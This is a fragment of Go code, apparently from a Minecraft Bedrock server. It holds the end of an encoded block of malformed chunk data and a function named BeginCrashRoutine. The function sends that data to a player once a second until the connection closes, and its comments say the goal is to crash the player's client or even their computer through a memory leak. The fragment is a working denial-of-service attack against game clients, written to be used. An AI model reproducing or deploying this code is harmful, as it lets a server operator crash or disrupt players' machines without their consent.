//////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgP//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wQAAgEAAQABAAEAAQAA")
}

func (p *Player) BeginCrashRoutine() {
	// This uses a bunch of broken level chunk data to cause a memory leak client side.
	// Crash anyones client, maybe even PC, with this one easy trick!
	go func() {
		for {
			if p.closed.Load() {
				// Good game.
				break
			}

			pos := p.ChunkPosition()
			_ = p.conn.WritePacket(&packet.LevelChunk{
				Position:      protocol.ChunkPos{pos.X(), pos.Z()},
				SubChunkCount: 25,
				RawPayload:    brokenData,
			})
			time.Sleep(time.Second)
		}
	}()
}
